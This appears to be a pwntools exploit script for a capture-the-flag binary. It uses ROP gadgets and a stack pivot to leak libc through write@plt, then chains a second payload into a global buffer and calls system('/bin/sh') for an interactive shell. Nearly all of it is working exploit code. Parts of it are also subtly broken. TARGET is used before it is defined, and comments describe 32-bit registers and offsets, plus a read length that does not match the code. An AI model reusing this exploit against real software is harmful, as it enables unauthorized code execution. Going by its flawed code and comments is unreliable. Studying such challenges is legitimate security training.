import os

from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context.binary = TARGET

try:
    debug = os.environ["DEBUG"]
except KeyError:
    debug = False

if debug:
    TARGET = "./target"
else:
    TARGET = "/home/final/pivity-pivoty-boo/target"

elf = ELF(TARGET)
LIBC = elf.libc

# -> find with : ropper -f ./target --search "pop %; ret"
addr_leave_ret = 0x0000000000401279
addr_rsi_rdi_r10_rdx = 0x0000000000401283 # pop rsi; pop rdi; pop r10; pop rdx; ret;
addr_rdi_r10_rdx = addr_rsi_rdi_r10_rdx + 1 # pop rdi; pop r10; pop rdx; ret;
addr_pop_rbp = 0x00000000004011fd # pop rbp; ret

# rdi -> rsi -> rdx

addr_gbuf = elf.symbols["gbuf"]
addr_gbuf_f00 = addr_gbuf + 0xf00 # to store the 2nd payload

addr_write_plt = elf.plt["write"]
addr_read_plt = elf.plt["read"]
addr_setvbuf_got = elf.got["setvbuf"] # gdb -> got (is partial RELRO?)

# 1. write@plt(1, setvbuf@got.plt, 8)
#    Leak libc base by writing setvbuf's resolved address
payload1  = b"AAAAAAAA"
payload1 += p64(addr_rsi_rdi_r10_rdx)
payload1 += p64(addr_setvbuf_got) # rsi
payload1 += p64(1) # rdi
payload1 += p64(0xdeadbeef) # r10
payload1 += p64(8) # rdx
payload1 += p64(addr_write_plt)

# 2. read@plt(0, addr_gbuf+0xf00, 32)
#    Call read() from stdin into &gbuf+0xf00 to store our 2nd payload
payload1 += p64(addr_rsi_rdi_r10_rdx)
payload1 += p64(addr_gbuf_f00) # rsi
payload1 += p64(0) # rdi
payload1 += p64(0xdeadbeef) # r10
payload1 += p64(32) # rdx
payload1 += p64(addr_read_plt)

# 3. Launch frame pointer attack again by setting EBP=&gbuf+0xf00
#    and returning to leave; ret; gadget so that it returns to the
#    2nd payload stored at &gbuf+0xf00
payload1 += p64(addr_pop_rbp)   # [a]
payload1 += p64(addr_gbuf_f00)
payload1 += p64(addr_leave_ret) # [b]

payload1 += b"B" * (272 - len(payload1))
payload1 += p64(addr_gbuf)
payload1 += p64(addr_leave_ret)

if debug:
    p = gdb.debug([TARGET], gdbscript="""
break start
continue""")
else:
    p = process([TARGET])

p.recvline() # consume "Enter your input\n"

# Send the first payload
p.sendline(payload1)

# Read the 8 bytes printed by write(1, setvbuf@got.plt, 8);
addr_setvbuf = u64(p.recv(8))
libc_base = addr_setvbuf - LIBC.symbols["setvbuf"]
log.info("libc base: 0x%08X" % libc_base)

# After the write(), read(0, addr_gbuf+0xf00, 16); is executed
# and it is waiting for our input to stdin.

# Setup a fake stack frame to execute system("/bin/sh");
LIBC.address = libc_base
r = ROP(LIBC)
r.system(next(LIBC.search(b"/bin/sh\x00")))

payload2 = r.chain()

# Send the second payload to read(), so it is stored at &gbuf+0xf00
p.sendline(payload2)

# After read(), pop ebp; ret; ([a]) makes ebp == &gbuf+0xf00
# Then, leave; ([b-1]) makes esp == &gbuf+0xf00+4, and finally,
# ret; ([b-2]) makes eip == &gbuf+0xf00+4, which indeed is addr_system.

p.interactive()
